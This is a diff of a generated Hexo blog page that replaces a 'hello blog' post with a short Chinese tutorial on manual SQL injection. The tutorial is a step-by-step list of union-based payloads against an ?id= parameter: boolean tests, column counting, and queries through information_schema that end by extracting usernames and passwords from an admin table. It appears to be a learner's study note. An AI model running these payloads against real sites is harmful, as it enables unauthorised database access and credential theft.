@@ -5,17 +5,17 @@
   
 
   
-  <title>hello blog | Hexo</title>
+  <title>sql注入简单流程 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="你好世界hello my blog！">
+  <meta name="description" content="##第一步，判断是否存在sql注入漏洞 ###?id&#x3D;1 and 1&#x3D;1——–页面返回正常 ###?id&#x3D;1 and 1&#x3D;2——–页面返回不正常，初步判断这里 可能 存在一个注入漏洞 ##第二步:判断字段数 ###?id&#x3D;1 and 1&#x3D;1 order by 1  回车——-页面正常 ###?id&#x3D;1 and 1&#x3D;1 order by 2  回车——-页面正常 ###?id&#x3D;1 and 1&#x3D;1 o">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hello blog">
-<meta property="og:url" content="http://example.com/2020/09/23/hello-blog/index.html">
+<meta property="og:title" content="sql注入简单流程">
+<meta property="og:url" content="http://example.com/2020/09/24/sql-1/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="你好世界hello my blog！">
+<meta property="og:description" content="##第一步，判断是否存在sql注入漏洞 ###?id&#x3D;1 and 1&#x3D;1——–页面返回正常 ###?id&#x3D;1 and 1&#x3D;2——–页面返回不正常，初步判断这里 可能 存在一个注入漏洞 ##第二步:判断字段数 ###?id&#x3D;1 and 1&#x3D;1 order by 1  回车——-页面正常 ###?id&#x3D;1 and 1&#x3D;1 order by 2  回车——-页面正常 ###?id&#x3D;1 and 1&#x3D;1 o">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-09-22T17:07:35.000Z">
-<meta property="article:modified_time" content="2020-09-22T17:17:53.852Z">
+<meta property="article:published_time" content="2020-09-24T14:32:50.000Z">
+<meta property="article:modified_time" content="2020-09-24T14:45:17.567Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -66,10 +66,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-hello-blog" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-sql-1" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/09/23/hello-blog/" class="article-date">
-  <time datetime="2020-09-22T17:07:35.000Z" itemprop="datePublished">2020-09-23</time>
+    <a href="/2020/09/24/sql-1/" class="article-date">
+  <time datetime="2020-09-24T14:32:50.000Z" itemprop="datePublished">2020-09-24</time>
 </a>
     
   </div>
@@ -80,7 +80,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      hello blog
+      sql注入简单流程
     </h1>
   
 
@@ -88,11 +88,34 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="你好世界"><a href="#你好世界" class="headerlink" title="你好世界"></a>你好世界</h1><h2 id="hello-my-blog！"><a href="#hello-my-blog！" class="headerlink" title="hello my blog！"></a>hello my blog！</h2>
+        <p>##<strong>第一步，判断是否存在sql注入漏洞</strong></p>
+<p>###?id=1 and 1=1——–页面返回正常</p>
+<p>###?id=1 and 1=2——–页面返回不正常，初步判断这里 可能 存在一个注入漏洞</p>
+<p>##<strong>第二步:判断字段数</strong></p>
+<p>###?id=1 and 1=1 order by 1  回车——-页面正常</p>
+<p>###?id=1 and 1=1 order by 2  回车——-页面正常</p>
+<p>###?id=1 and 1=1 order by 3  回车——-页面不正常</p>
+<p>##<strong>第三步：判断回显点</strong></p>
+<p>###?id=1 and 1=2 union select 1,2——页面出现了  2  ，说明我们可以在数字  2  处显示我们想要的内容</p>
+<p>##<strong>第四步:查询相关内容</strong></p>
+<p>###查询当前数据库名</p>
+<p>###?id=1 and 1=2 union select 1,database() </p>
+<p>###查询当前数据库版本</p>
+<p>###?id=1 and 1=2 union select 1,version() </p>
+<p>###查询当前数据库 表名</p>
+<p>###?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1</p>
+<p>###查询字段名</p>
+<p>###?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 0,1 </p>
+<p>###?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 2,1————查出 admin 表里 有  id  username  password  三个字段</p>
+<p>###查询字段内容</p>
+<p>###?id=1 and 1=2 union select 1,username from admin  limit 0,1</p>
+<p>###?id=1 and 1=2 union select 1,password from admin  limit 1,1</p>
+<p>###?id=1 and 1=2 union select 1,password from admin  limit 0,1</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/09/23/hello-blog/" data-id="ckfe7pmx50001dsv17p854knv" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/09/24/sql-1/" data-id="ckfgxhpuc0000ywv18soge7mk" class="article-share-link">Share</a>
       
       
     </footer>
@@ -101,19 +124,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2020/09/24/sql-1/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          sql注入简单流程
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/09/23/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2020/09/23/hello-blog/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Hello World</div>
+      <div class="article-nav-title">hello blog</div>
     </a>
   
 </nav>
